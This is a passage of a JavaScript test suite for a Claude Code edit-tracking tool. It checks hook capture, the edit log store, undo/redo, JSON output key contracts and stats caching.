  assert.ok(core.isOurCommand('node "/opt/anything/dist/capture.js" #claude-observatory-hook'));
  // Fallbacks for legacy/manual entries.
  assert.ok(core.isOurCommand('node "/a/claude_review/packages/cli/dist/capture.js"'));
  assert.ok(core.isOurCommand('node "/usr/lib/node_modules/claude-observatory/dist/index.js" capture'));
  // Not ours.
  assert.ok(!core.isOurCommand('node "/other/tool/dist/capture.js"'), 'no marker, no claude token');
  assert.ok(!core.isOurCommand('echo claude-observatory hi'), 'not the capture entrypoint');
});

test('session: resolveSessionId picks newest and walks up from a subdirectory', () => {
  const home = freshHome();
  // path.resolve makes the fake cwd drive-absolute on Windows (D:\Users\x\proj), matching what
  // resolveSessionId's own resolve() produces — a POSIX literal would mangle to a different dir name.
  const cwd = path.resolve('/Users/x/proj');
  const proj = path.join(home, '.claude', 'projects', cwd.replace(/[^a-zA-Z0-9]/g, '-'));
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, 'old.jsonl'), '{}');
  fs.writeFileSync(path.join(proj, 'new.jsonl'), '{}');
  fs.utimesSync(path.join(proj, 'old.jsonl'), 1000, 1000);
  fs.utimesSync(path.join(proj, 'new.jsonl'), 2000, 2000);
  assert.equal(core.resolveSessionId(cwd), 'new');
  assert.equal(core.resolveSessionId(cwd + '/sub/deep'), 'new', 'ancestor walk');
  assert.equal(core.resolveSessionId('/nowhere/zzz'), null);
});

test('contract: each --json command emits the documented key set (rename-guard for both editors)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'contract';
  const F = path.join(tmpWork(), 'app.js');
  seedEdit(S, F, 'a\n', 'a\nb\n'); // #1
  seedEdit(S, F, 'a\nb\n', 'a\nB\n'); // #2
  seedEdit(S, path.join(path.dirname(F), 'sub', 'nested.js'), 'x\n', 'x\ny\n'); // #3 — forces a folder node
  // A minimal transcript under THIS cwd's project dir: `sessions` is workspace-filtered (0.8.8), so a
  // session must have a transcript findable from the spawn's cwd to be listed.
  const proj = core.projectDir(process.cwd());
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), JSON.stringify({ timestamp: new Date(500).toISOString(), message: { role: 'user', content: 'Contract fixture session' } }) + '\n');
  const env = { ...process.env, HOME: home, USERPROFILE: home, CLAUDE_OBSERVATORY_SESSION: S };
  const runJson = (args) => JSON.parse(cp.execFileSync('node', [CLI, ...args], { env, encoding: 'utf8' }));
  const hasKeys = (obj, keys, where) => {
    for (const k of keys) assert.ok(obj && Object.prototype.hasOwnProperty.call(obj, k), `${where}: missing key "${k}"`);
  };
  // Read-only shapes (JetBrains + scripts key on these names — add fields, never rename).
  const list = runJson(['list', '--json']);
  hasKeys(list, ['session', 'edits'], 'list');
  // The FULL session trace (`export`) — the one document that carries everything recorded.
  const trace = runJson(['export']);
  hasKeys(trace, ['exportedAt', 'tool', 'session', 'title', 'root', 'summary', 'edits', 'skips', 'prompts',
    'actions', 'tasks', 'subagents', 'egress', 'outsideWrites', 'observations', 'usage', 'errors'], 'export');
  assert.equal(trace.edits.length, 3, 'export carries every edit');
  hasKeys(trace.edits[0], ['id', 'ts', 'tool', 'file', 'status', 'added', 'removed', 'diff'], 'export.edits[]');
  assert.match(trace.edits[0].diff, /^Index: /, 'each edit carries its reconstructed unified diff');
  assert.deepEqual(trace.errors, [], 'no section fails to build on a healthy store');
  hasKeys(list.edits[0], ['id', 'ts', 'tool', 'file', 'status', 'added', 'removed'], 'list.edits[]');
  hasKeys(runJson(['status', '--json']), ['hooksInstalled', 'hookScript', 'session', 'store', 'lastCaptureTs', 'counts', 'skipped'], 'status');
  const sessions = runJson(['sessions', '--json']);
  hasKeys(sessions, ['active', 'sessions'], 'sessions');
  // Every field the Sessions rows RENDER, in both editors. The list stopped at `current` while 0.9.0 added
  // nine more, so dropping any of them (verified: emitting only the first four) left a green build and a
  // Sessions tab of "+0 -0 . 0 tok" blanks — JetBrains parses exactly these names off each row.
  hasKeys(sessions.sessions[0],
    ['id', 'title', 'lastActiveMs', 'current', 'edits', 'pending', 'files', 'added', 'removed', 'tokens', 'durationMs', 'model', 'effort'],
    'sessions.sessions[]');
  const tree = runJson(['tree', '--json']);
  hasKeys(tree, ['folders', 'files'], 'tree');
  hasKeys(tree.folders[0], ['label', 'path', 'folders', 'files'], 'tree.folders[]'); // `path` drives scoped folder ops
  const observe = runJson(['observe']); // observe is always JSON
  hasKeys(observe, ['session', 'recap', 'insights', 'suggestions', 'edits'], 'observe');
  hasKeys(observe.edits[0], ['id', 'ts', 'tool', 'file', 'status', 'summary', 'reasoning', 'flags', 'memory', 'analysis'], 'observe.edits[]');
  hasKeys(runJson(['usage']), ['staleMs', 'sessionTokens', 'vitals'], 'usage'); // vitals: the Stats model/effort chip
  // Mutations (undo/redo branch on `status`; keep on `kept`) — run these last.
  hasKeys(runJson(['keep', '1', '--json']), ['kept', 'ids'], 'keep');
  const undo = runJson(['undo', '2', '--json']);
  hasKeys(undo, ['ok', 'status', 'message'], 'undo');
});

test('contract 0.8.0: every machine surface the editors consume emits its documented key set (rename-guard)', async () => {
  // The gap this closes: the fast rename-guard above predates 0.8.0 — a key rename in multitask/
  // changemap/tasklog/chat-context/observations/metrics/siblings only failed the slow bash e2e.
  // The demo simulator is the fixture: a real-pipeline session with tasks, a subagent, a workflow.
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const ws = tmpWork();
  fs.mkdirSync(path.join(ws, '.git'), { recursive: true }); // a plain .git dir → commonDir resolves → fleet/worktree paths engage
  const demo = await core.runDemo({ fast: true, cwd: ws });
  const env = { ...process.env, HOME: home, USERPROFILE: home, CLAUDE_OBSERVATORY_SESSION: demo.session };
  const runJson = (args) => JSON.parse(cp.execFileSync('node', [CLI, ...args], { env, cwd: ws, encoding: 'utf8' }));
  const hasKeys = (obj, keys, where) => {
    for (const k of keys) assert.ok(obj && Object.prototype.hasOwnProperty.call(obj, k), `${where}: missing key "${k}"`);
  };

  // multitask — the Overview left nav (Fleet · Workflows · curated Actions) in both editors.
  const mt = runJson(['multitask', '--json']);
  hasKeys(mt, ['agents', 'collisions', 'worktrees', 'workflows', 'actions', 'summary'], 'multitask');
  // Select the SELF row, never agents[0]: listRepoSiblings sorts by transcript mtime, and the demo's
  // sibling agent can hold that slot. A positional assumption here fails as a confusing TypeError.
  const self = mt.agents.find((a) => a.self);
  assert.ok(self, 'the active session appears in its own fleet');
  hasKeys(self, ['session', 'worktree', 'gitBranch', 'self', 'phase', 'phaseConfidence', 'sparkline', 'todos', 'subagents', 'files', 'diff', 'tokens', 'durationMs', 'risk', 'outside', 'compactions', 'folded', 'loaded'], 'multitask.agents[]');
  hasKeys(self.subagents[0], ['agentId', 'agentType', 'description', 'phase', 'phaseConfidence', 'todos', 'currentTask', 'edits', 'added', 'removed'], 'multitask.agents[].subagents[]');
  hasKeys(mt.workflows[0], ['id', 'name', 'phases', 'agents', 'phaseGroups', 'running', 'lastActivityMs', 'agentCount', 'tokens', 'durationMs', 'edits', 'added', 'removed', 'sparkline'], 'multitask.workflows[]');
  hasKeys(mt.actions, ['groups', 'egress'], 'multitask.actions');
  hasKeys(mt.summary, ['active', 'conflicts'], 'multitask.summary');

  // changemap — the Overview detail (ribbon · strip · ledger) + per-agent slices.
  const cm = runJson(['changemap', '--json']);
  hasKeys(cm, ['summary', 'edits', 'compactions', 'files', 'modules', 'tasks', 'prompts', 'rollupByTask', 'rollupBySubagent', 'rollupByWorkflow', 'workflows', 'rollupByAgent', 'agents', 'unassigned'], 'changemap');
  assert.ok(!('subtasks' in cm) && !('chapters' in cm), 'the display-subtask layer is gone (0.8.8) — neither key is emitted');
  // 0.8.7 folded the footprint into the risk/egress audits — see `risk --json`.outsideWrites and the
  // `file` channels in `egress --json`. The change map no longer carries a badge-row payload.
  assert.ok(!('footprint' in cm), 'changemap carries no footprint — it folded into risk + egress');
  hasKeys(cm.summary, ['session', 'title'], 'changemap.summary'); // title drives the Overview selector + Stats session name (JetBrains)
  hasKeys(cm.tasks[0], ['taskId', 'content', 'firstTs', 'lastTs'], 'changemap.tasks[]'); // the strict identities the Tasks tab + tasklog join
  hasKeys(cm.prompts[0], ['id', 'index', 'text', 'title', 'ts', 'endTs', 'rollup', 'files', 'modules', 'editIds', 'agentIds', 'workflowIds', 'processIds', 'actions', 'errors', 'compactions', 'durationMs'], 'changemap.prompts[]');
  hasKeys(cm.edits[0], ['id', 'rel', 'module', 'file', 'added', 'removed', 'status', 'ts', 'agent', 'risk', 'reasoning', 'taskId', 'subagentId', 'workflowId'], 'changemap.edits[]');
  hasKeys(cm.workflows[0], ['id', 'name', 'running', 'rollup', 'files', 'taskIds'], 'changemap.workflows[]');
  hasKeys(cm.agents[0], ['session', 'worktree', 'gitBranch', 'phase', 'lastMs', 'summary', 'files', 'modules'], 'changemap.agents[]');
  // Per-sibling `edits` is deliberately projected out: 1.95 MB of a 3.30 MB payload that no renderer
  // read. The ACTIVE session's own top-level edits stay — that is the list tools consume.
  assert.ok(!('edits' in cm.agents[0]), 'changemap.agents[] carries no per-sibling edit list');
  assert.ok(Array.isArray(cm.edits), 'the session\'s own edits are untouched');
  const sess = runJson(['sessions', '--json']);
  hasKeys(sess, ['active', 'sessions'], 'sessions');
  hasKeys(sess.sessions[0], ['id', 'title', 'lastActiveMs', 'current'], 'sessions.sessions[]'); // no pending counts — recency + name only (0.8.8)

  // tasklog / chat-context / observations / metrics / siblings --repo.
  const tl = runJson(['tasklog']);
  assert.ok(Array.isArray(tl) && tl.length >= 1, 'tasklog: one row per stable task');
  hasKeys(tl[0], ['taskId', 'content', 'agentIds', 'subagentIds', 'firstTs', 'lastTs', 'edits', 'added', 'removed', 'status'], 'tasklog[]');
  hasKeys(runJson(['chat-context', '--task', tl[0].taskId]), ['prompt'], 'chat-context');
  const obs = runJson(['observations']);
  hasKeys(obs, ['recap', 'runs', 'nextSteps', 'context'], 'observations');
  hasKeys(obs.context, ['sources', 'note'], 'observations.context'); // the Context section in both editors
  hasKeys(obs.runs[0], ['file', 'rel', 'count', 'added', 'removed', 'status', 'edits'], 'observations.runs[]');
  const met = runJson(['metrics', '--json']);
  hasKeys(met, ['session', 'spanMs', 'actions', 'edits', 'subagents', 'toolLatency'], 'metrics');
  const sib = runJson(['siblings', '--json', '--repo', '--all']);
  hasKeys(sib, ['session', 'summary', 'siblings'], 'siblings');
  hasKeys(sib.siblings[0], ['id', 'self', 'active', 'lastMs', 'edits', 'pending', 'files', 'pendingFiles', 'risk', 'worktree', 'gitBranch', 'phase', 'phaseConfidence'], 'siblings.siblings[]');
});

test('capture: hook subprocess records an edit and prints NOTHING to stdout', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'a.txt');
  fs.writeFileSync(F, 'one\ntwo\n');
  const S = 'capSess';
  const env = { ...process.env, HOME: home };
  const pre = JSON.stringify({ session_id: S, cwd: dir, hook_event_name: 'PreToolUse', tool_name: 'Edit', tool_input: { file_path: F } });
  assert.equal(cp.execFileSync('node', [CAPTURE], { input: pre, env, encoding: 'utf8' }), '', 'Pre: no stdout');
  fs.writeFileSync(F, 'ONE\ntwo\n'); // the edit
  const post = JSON.stringify({ session_id: S, cwd: dir, hook_event_name: 'PostToolUse', tool_name: 'Edit', tool_input: { file_path: F } });
  assert.equal(cp.execFileSync('node', [CAPTURE], { input: post, env, encoding: 'utf8' }), '', 'Post: no stdout');
  const lines = fs.readFileSync(path.join(home, '.claude', 'claude-observatory', S, 'log.jsonl'), 'utf8').trim().split('\n');
  assert.equal(lines.length, 1);
  const rec = JSON.parse(lines[0]);
  assert.equal(rec.tool, 'Edit');
  assert.equal(rec.file, F);
  assert.equal(rec.status, 'pending');
});

// --- additional edge-case coverage -------------------------------------------------------------

const crypto = require('crypto');
const sha = (s) => crypto.createHash('sha256').update(s).digest('hex');

// Run the bundled capture hook subprocess with a hook payload; returns its stdout (must be '').
function runHook(home, session, dir, event, tool, file, keyField = 'file_path') {
  const ti = {};
  ti[keyField] = file;
  const payload = JSON.stringify({ session_id: session, cwd: dir, hook_event_name: event, tool_name: tool, tool_input: ti });
  return cp.execFileSync('node', [CAPTURE], { input: payload, env: { ...process.env, HOME: home }, encoding: 'utf8' });
}
function readStoreLog(home, session) {
  const p = path.join(home, '.claude', 'claude-observatory', session, 'log.jsonl');
  if (!fs.existsSync(p)) return [];
  return fs.readFileSync(p, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l));
}

test('capture: MultiEdit is captured as one record (tool=MultiEdit) and undoes cleanly', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'm.txt');
  const before = 'L1\nL2\nL3\nL4\nL5\n';
  fs.writeFileSync(F, before);
  const S = 'multi';
  runHook(home, S, dir, 'PreToolUse', 'MultiEdit', F);
  fs.writeFileSync(F, 'TOP\nL2\nL3\nL4\nBOT\n'); // two non-adjacent hunks committed as one MultiEdit
  runHook(home, S, dir, 'PostToolUse', 'MultiEdit', F);
  const log = readStoreLog(home, S);
  assert.equal(log.length, 1, 'one record for the whole MultiEdit');
  assert.equal(log[0].tool, 'MultiEdit', 'recorded tool field is MultiEdit');
  const res = core.undoEdit(S, log[0].id); // clean revert (no later edits) — byte-exact
  assert.equal(res.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), before, 'the whole MultiEdit is reverted');
});

test('capture: a PostToolUse with no matching Pre records nothing (no phantom edit)', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'x.txt');
  fs.writeFileSync(F, 'hi\n');
  const S = 'nopre';
  runHook(home, S, dir, 'PostToolUse', 'Edit', F); // Post only — Pre never ran
  assert.equal(readStoreLog(home, S).length, 0, 'nothing committed without a staged before-snapshot');
});

test('store: skip markers are recorded, ignored by readLog, and surfaced by readSkips', () => {
  freshHome();
  const S = 'skips';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\n', 'b\n'); // a normal edit (#1)
  core.appendSkip(S, '/big/file.bin', 'file too large');
  core.appendSkip(S, '<bash-tree>', 'tree too large');
  const log = core.readLog(S);
  assert.equal(log.length, 1, 'skip markers are NOT edit records (folded out of readLog)');
  assert.equal(log[0].id, 1);
  const skips = core.readSkips(S);
  assert.equal(skips.length, 2);
  assert.equal(skips[0].reason, 'file too large');
  assert.equal(skips[1].file, '<bash-tree>');
});

test('capture: an edit that grows a file past 5MB leaves a skip marker (not a silent drop)', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'big.txt');
  fs.writeFileSync(F, 'small\n'); // ≤5MB at Pre
  const S = 'toobig';
  runHook(home, S, dir, 'PreToolUse', 'Edit', F);
  fs.writeFileSync(F, 'X'.repeat(5 * 1024 * 1024 + 1)); // grew past MAX_BYTES
  runHook(home, S, dir, 'PostToolUse', 'Edit', F);
  assert.equal(core.readLog(S).length, 0, 'no edit record for the too-large file');
  assert.equal(core.readSkips(S).length, 1, 'but a skip marker IS recorded');
});

test('store: readLog skips malformed/partial lines and folds status ops', () => {
  freshHome();
  const S = 'malformed';
  core.ensureStore(S);
  const lp = core.logPath(S);
  // valid record, a garbage line, a partial (truncated) JSON line, then a status op
  fs.writeFileSync(
    lp,
    JSON.stringify({ id: 1, ts: 1, tool: 'Edit', file: '/f', beforeBlob: null, afterBlob: sha('x'), status: 'pending' }) + '\n' +
      'not json at all\n' +
      '{"id":2,"ts":2,"tool":"Edit","file":"/g","before\n' + // truncated
      JSON.stringify({ op: 'status', id: 1, status: 'kept', ts: 3 }) + '\n'
  );
  const log = core.readLog(S);
  assert.equal(log.length, 1, 'only the one well-formed record survives');
  assert.equal(log[0].id, 1);
  assert.equal(log[0].status, 'kept', 'status op folded onto the record');
});

test('store: status folding — last op wins in file order; redundant setStatus appends nothing', () => {
  freshHome();
  const S = 'fold';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\n', 'b\n');
  core.setStatus(S, 1, 'kept');
  core.setStatus(S, 1, 'undone');
  core.setStatus(S, 1, 'pending'); // last op -> pending wins
  assert.equal(core.findRecord(S, 1).status, 'pending');
  const before = fs.readFileSync(core.logPath(S), 'utf8');
  const r = core.setStatus(S, 1, 'pending'); // redundant: already pending
  assert.equal(r.status, 'pending');
  assert.equal(fs.readFileSync(core.logPath(S), 'utf8'), before, 'no redundant status op appended');
});

test('store: clearResolved keeps a pending edit that shares a blob with a removed kept edit', () => {
  freshHome();
  const S = 'sharedblob';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'A\n', 'B\n'); // #1 A->B (will be kept, then cleared)
  seedEdit(S, F, 'B\n', 'C\n'); // #2 B->C (pending) — its beforeBlob == #1.afterBlob (blob "B")
  core.setStatus(S, 1, 'kept');
  const removed = core.clearResolved(S);
  assert.equal(removed, 1);
  const log = core.readLog(S);
  assert.equal(log.length, 1);
  assert.equal(log[0].id, 2);
  // The shared blob "B\n" must survive GC because pending #2 still references it as its before.
  const blobs = fs.readdirSync(path.join(core.storeDir(S), 'blobs'));
  assert.ok(blobs.includes(sha('B\n')), 'shared blob B survives GC');
  assert.ok(!blobs.includes(sha('A\n')), 'blob A (only ref by removed kept edit) is GCd');
  // And undo of the surviving pending edit still works (proves the before blob is intact).
  fs.writeFileSync(F, 'C\n');
  const u = core.undoEdit(S, 2);
  assert.equal(u.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'B\n');
});

test('store: clearResolved on an all-resolved session empties the log, GCs all blobs, resets nextId', () => {
  freshHome();
  const S = 'allresolved';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\n', 'b\n');
  seedEdit(S, F, 'b\n', 'c\n');
  core.setStatus(S, 1, 'kept');
  core.setStatus(S, 2, 'undone');
  assert.equal(core.clearResolved(S), 2);
  assert.equal(core.readLog(S).length, 0, 'log emptied');
  assert.equal(fs.readdirSync(path.join(core.storeDir(S), 'blobs')).length, 0, 'all blobs GCd');
  assert.equal(core.nextId(S), 1, 'nextId resets to 1 on an empty log');
});

test('undo: a KEPT (non-pending) edit can still be undone', () => {
  freshHome();
  const S = 'undokept';
  const F = path.join(tmpWork(), 'f.txt');
  seedEdit(S, F, 'a\n', 'b\n');
  fs.writeFileSync(F, 'b\n');
  core.setStatus(S, 1, 'kept');
  const r = core.undoEdit(S, 1);
  assert.equal(r.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'a\n');
  assert.equal(core.findRecord(S, 1).status, 'undone');
});

test('undo: later append with NO trailing newline merges cleanly (no false conflict)', () => {
  freshHome();
  const S = 'eol';
  const F = path.join(tmpWork(), 'eol.txt');
  seedEdit(S, F, 'a\nb\n', 'A\nb\n'); // #1 a->A
  seedEdit(S, F, 'A\nb\n', 'A\nb\nc'); // #2 append "c" with no trailing newline
  fs.writeFileSync(F, 'A\nb\nc');
  const r = core.undoEdit(S, 1);
  assert.equal(r.status, 'undone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'a\nb\nc', 'A->a undone, appended c (no trailing nl) preserved');
});

test('redo: re-creating a create conflicts if the file was re-made with different content; --force wins', () => {
  freshHome();
  const S = 'redocreatediff';
  const F = path.join(tmpWork(), 'n.txt');
  seedEdit(S, F, null, 'created\n'); // #1 create
  core.undoEdit(S, 1); // deletes the file
  fs.writeFileSync(F, 'SOMETHING ELSE\n'); // re-created by hand with different content
  const r = core.redoEdit(S, 1);
  assert.equal(r.status, 'conflict', 'redo must not clobber a differently-recreated file');
  assert.equal(fs.readFileSync(F, 'utf8'), 'SOMETHING ELSE\n', 'file untouched on conflict');
  const r2 = core.reapplyFile(S, 1); // --force
  assert.equal(r2.status, 'redone');
  assert.equal(fs.readFileSync(F, 'utf8'), 'created\n', 'force reapply restores the created content');
  assert.equal(core.findRecord(S, 1).status, 'pending');
});

test('capture: a no-op edit (before == after) is NOT logged', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'same.txt');
  fs.writeFileSync(F, 'unchanged\n');
  const S = 'capnoop';
  runHook(home, S, dir, 'PreToolUse', 'Edit', F);
  // no change on disk
  runHook(home, S, dir, 'PostToolUse', 'Edit', F);
  assert.equal(readStoreLog(home, S).length, 0, 'identical before/after produces no record');
});

test('capture: an empty new-file create is logged as a create (beforeBlob null)', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'empty.txt');
  const S = 'capempty';
  runHook(home, S, dir, 'PreToolUse', 'Write', F); // file missing -> before null
  fs.writeFileSync(F, ''); // creates an empty (0-byte) file
  runHook(home, S, dir, 'PostToolUse', 'Write', F);
  const log = readStoreLog(home, S);
  assert.equal(log.length, 1);
  assert.equal(log[0].beforeBlob, null, 'new file -> before is null');
  assert.equal(log[0].afterBlob, sha(''), 'after is the empty-content blob');
});

test('capture: a binary file (contains a NUL byte) is not captured', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'b.bin');
  const S = 'capbin';
  fs.writeFileSync(F, Buffer.from([1, 2, 0, 3]));
  runHook(home, S, dir, 'PreToolUse', 'Write', F);
  fs.writeFileSync(F, Buffer.from([4, 5, 0, 6]));
  runHook(home, S, dir, 'PostToolUse', 'Write', F);
  assert.equal(readStoreLog(home, S).filter((r) => r.op !== 'skip').length, 0, 'binary edits are not captured as edit records');
  assert.equal(core.readSkips(S).length, 1, 'but a skip marker IS left — a binary edit is not silently dropped');
});

test('capture: rapid successive edits to the same file chain before/after correctly', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'a.txt');
  fs.writeFileSync(F, 'v0\n');
  const S = 'caprapid';
  runHook(home, S, dir, 'PreToolUse', 'Edit', F);
  fs.writeFileSync(F, 'v1\n');
  runHook(home, S, dir, 'PostToolUse', 'Edit', F);
  runHook(home, S, dir, 'PreToolUse', 'Edit', F);
  fs.writeFileSync(F, 'v2\n');
  runHook(home, S, dir, 'PostToolUse', 'Edit', F);
  const log = readStoreLog(home, S);
  assert.equal(log.length, 2);
  assert.deepEqual([log[0].id, log[1].id], [1, 2]);
  assert.equal(log[0].beforeBlob, sha('v0\n'));
  assert.equal(log[0].afterBlob, sha('v1\n'));
  assert.equal(log[1].beforeBlob, sha('v1\n'), 'edit #2 before == edit #1 after (no stale staging)');
  assert.equal(log[1].afterBlob, sha('v2\n'));
});

test('capture: NotebookEdit is captured via notebook_path', () => {
  const home = freshHome();
  const dir = tmpWork();
  const F = path.join(dir, 'nb.ipynb');
  fs.writeFileSync(F, '{"cells":[]}\n');
  const S = 'capnb';
  runHook(home, S, dir, 'PreToolUse', 'NotebookEdit', F, 'notebook_path');
  fs.writeFileSync(F, '{"cells":[1]}\n');
  runHook(home, S, dir, 'PostToolUse', 'NotebookEdit', F, 'notebook_path');
  const log = readStoreLog(home, S);
  assert.equal(log.length, 1);
  assert.equal(log[0].tool, 'NotebookEdit');
  assert.equal(log[0].file, F);
});

test('classes: nested python (innermost wins) + unclosed brace class ends at EOF', () => {
  const src = 'class Outer:\n    x = 1\n    class Inner:\n        y = 2\n    z = 3\n';
  const spans = core.detectClasses(src);
  assert.equal(spans.length, 2);
  const outer = spans.find((s) => s.name === 'Outer');
  const inner = spans.find((s) => s.name === 'Inner');
  assert.deepEqual([outer.start, outer.end], [0, 4], 'Outer spans its whole indented body');
  assert.deepEqual([inner.start, inner.end], [2, 3], 'Inner is the nested class');
  assert.equal(core.classAt(spans, 3).name, 'Inner', 'innermost span wins for a nested line');
  assert.equal(core.classAt(spans, 4).name, 'Outer', 'a line back at Outer indent belongs to Outer');
  // An unterminated brace class runs to EOF (no trailing newline -> 3 lines, indices 0..2).
  const bad = core.detectClasses('class Broke {\n  a() {\n  // never closed');
  assert.equal(bad.length, 1);
  assert.equal(bad[0].name, 'Broke');
  assert.equal(bad[0].end, 2, 'unclosed brace class ends at the last line');
});

test('session: mangleCwd maps spaces/unicode; resolveSessionId is null for a missing project dir', () => {
  freshHome();
  assert.equal(core.mangleCwd('/a b/proj-x'), '-a-b-proj-x', 'spaces and hyphens both become -');
  const uni = core.mangleCwd('/Users/café/proj');
  assert.ok(!/[^-a-zA-Z0-9]/.test(uni), 'no non-[-a-zA-Z0-9] chars survive mangling');
  assert.equal(uni, '-Users-caf--proj', 'non-ASCII letter (é) mangles to a single -');
  assert.equal(core.resolveSessionId('/definitely/not/a/real/project'), null);
});

test('observe: flagsFor detects debug/secret/large-deletion; summarize handles create+delete', () => {
  freshHome();
  const S = 'flags';
  const F = path.join(tmpWork(), 'svc.js');
  // create with a debug statement + a hard-coded secret
  const created = 'function f(){\n  console.log("dbg")\n  const api_key = "abc123"\n}\n';
  seedEdit(S, F, null, created);
  const f1 = core.flagsFor(S, core.findRecord(S, 1));
  assert.ok(f1.some((x) => /debug/.test(x.message)), 'flags a debug statement');
  assert.ok(f1.some((x) => /secret/.test(x.message)), 'flags a possible hard-coded secret');
  assert.match(core.summarize(S, core.findRecord(S, 1)), /created svc\.js/);
  // a large deletion
  const big = Array.from({ length: 40 }, (_, i) => `line${i}\n`).join('');
  seedEdit(S, F, big, 'line0\n');
  const f2 = core.flagsFor(S, core.findRecord(S, 2));
  assert.ok(f2.some((x) => /large deletion/.test(x.message)), 'flags a large deletion');
  // a deletion (afterBlob null)
  seedEdit(S, F, 'gone\n', null);
  assert.match(core.summarize(S, core.findRecord(S, 3)), /deleted svc\.js/);
  assert.ok(core.flagsFor(S, core.findRecord(S, 3)).some((x) => /file deleted/.test(x.message)));
});

test('install: a malformed (non-array) hooks shape is tolerated, not crashed (regression)', () => {
  const home = freshHome();
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  const sp = path.join(home, '.claude', 'settings.json');
  // valid JSON, but hooks.PreToolUse is an object where the code expects an array
  const original = { hooks: { PreToolUse: { matcher: 'Edit' } }, theme: 'dark' };
  fs.writeFileSync(sp, JSON.stringify(original));
  assert.doesNotThrow(() => core.hooksInstalled(sp));
  assert.equal(core.hooksInstalled(sp), false, 'reports not-installed instead of throwing');
  assert.equal(core.installedHookCommand(sp), null);
  // uninstall must not throw and must leave the unknown shape untouched
  let res;
  assert.doesNotThrow(() => {
    res = core.uninstallHooks(sp);
  });
  assert.equal(res.changed, false);
  assert.deepEqual(JSON.parse(fs.readFileSync(sp, 'utf8')), original, 'malformed shape left intact');
});

test('install: a second distinct command merges into the existing MATCHER group (no new group)', () => {
  const home = freshHome();
  fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
  const sp = path.join(home, '.claude', 'settings.json');
  const cmd1 = 'claude-observatory capture #claude-observatory-hook';
  const cmd2 = 'node "/legacy/claude_review/dist/capture.js"';
  assert.ok(core.installHooks(cmd1, sp).changed);
  assert.ok(core.installHooks(cmd2, sp).changed, 'a different command is a real change');
  const d = JSON.parse(fs.readFileSync(sp, 'utf8'));
  assert.equal(d.hooks.PreToolUse.length, 1, 'still a single matcher group');
  assert.equal(d.hooks.PreToolUse[0].matcher, core.MATCHER);
  assert.equal(d.hooks.PreToolUse[0].hooks.length, 2, 'both commands land in the same group');
  // uninstall removes both (both are recognizably ours) and prunes the empty group.
  assert.ok(core.uninstallHooks(sp).changed);
  assert.equal(core.hooksInstalled(sp), false);
  assert.deepEqual(JSON.parse(fs.readFileSync(sp, 'utf8')).hooks, {}, 'both empty event groups pruned');
});

// --- stats cache + bucketing edge cases ---------------------------------------------------------

const dk = (ts) => {
  const d = new Date(ts);
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
};
function writeTranscript(home, proj, session, msgs) {
  const dir = path.join(home, '.claude', 'projects', proj);
  fs.mkdirSync(dir, { recursive: true });
  const p = path.join(dir, session + '.jsonl');
  fs.writeFileSync(p, msgs.map((m) => JSON.stringify(m)).join('\n') + '\n');
  return p;
}
function assistantMsg(ts, extra = {}) {
  return {
    sessionId: extra.sessionId,
    timestamp: new Date(ts).toISOString(),
    type: 'assistant',
    isSidechain: extra.isSidechain === true,
    message: {
      role: 'assistant',
      usage: extra.usage || { input_tokens: 10, cache_read_input_tokens: 100, cache_creation_input_tokens: 0, output_tokens: 50 },
      content: extra.content || [{ type: 'text', text: 'hi' }],
    },
  };
}
const statsCachePath = () => path.join(os.homedir(), '.claude', 'claude-observatory', 'stats-cache.json');

test('stats: cache reused when unchanged, invalidated on mtime change, pruned for deleted files', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const now = Date.now();
  const A = writeTranscript(home, 'projA', 'sessA', [assistantMsg(now)]);
  let st = core.computeStats(undefined, now);
  assert.equal(st.daily[29].messages, 1, 'initial scan sees the message');
  const hr = new Date(now).getHours();
  assert.equal(st.hourly[hr].messages, 1, 'initial scan fills the hourly bucket');

  // Poison the cached aggregates: an UNCHANGED file must be served from the cache (proves reuse).
  const cache = JSON.parse(fs.readFileSync(statsCachePath(), 'utf8'));
  const entry = cache.files[A];
  assert.ok(entry, 'cache has an entry keyed by the transcript path');
  entry.days[dk(now)].msgs = 7;
  entry.hourly.hours[String(hr)].msgs = 5;
  fs.writeFileSync(statsCachePath(), JSON.stringify(cache));
  st = core.computeStats(undefined, now);
  assert.equal(st.daily[29].messages, 7, 'unchanged file served from the (poisoned) daily cache');
  assert.equal(st.hourly[hr].messages, 5, "today's hourly served from the cache too — no re-read");
  // A clean run must not rewrite the cache (nothing changed), so the poison persists.
  st = core.computeStats(undefined, now);
  assert.equal(st.daily[29].messages, 7, 'no-change run leaves the cache untouched');

  // Bump mtime -> stale entry invalidated, real values re-parsed.
  const later = new Date(Date.now() + 5000);
  fs.utimesSync(A, later, later);
  st = core.computeStats(undefined, now);
  assert.equal(st.daily[29].messages, 1, 'mtime change invalidates the cached aggregates');
